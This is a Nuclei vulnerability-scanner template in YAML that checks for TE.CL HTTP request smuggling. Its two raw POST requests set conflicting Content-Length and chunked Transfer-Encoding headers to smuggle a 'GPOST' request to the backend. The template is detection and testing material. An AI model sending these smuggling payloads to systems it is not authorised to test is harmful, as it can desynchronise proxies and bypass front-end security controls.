http:
- matchers:
  - dsl:
    - contains(body_2, "Unrecognized method GPOST")
    type: dsl
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Content-length: 4

    Transfer-Encoding: chunked


    5c

    GPOST / HTTP/1.1

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 15


    x=1

    0


    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Content-length: 4

    Transfer-Encoding: chunked


    5c

    GPOST / HTTP/1.1

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 15


    x=1

    0


    '
  unsafe: true
id: te-cl-http-smuggling
info:
  author: pdteam,akincibor
  description: 'Detected a potential TE.CL request smuggling condition where an injected
    Transfer-Encoding header conflicted with an existing Content-Length header, causing
    differing parsing behavior between proxy and backend.

    '
  metadata:
    max-request: 2
    verified: true
  name: Basic TE.CL - HTTP Request Smuggling
  reference:
  - https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
  severity: low
  tags: te-cl,smuggling
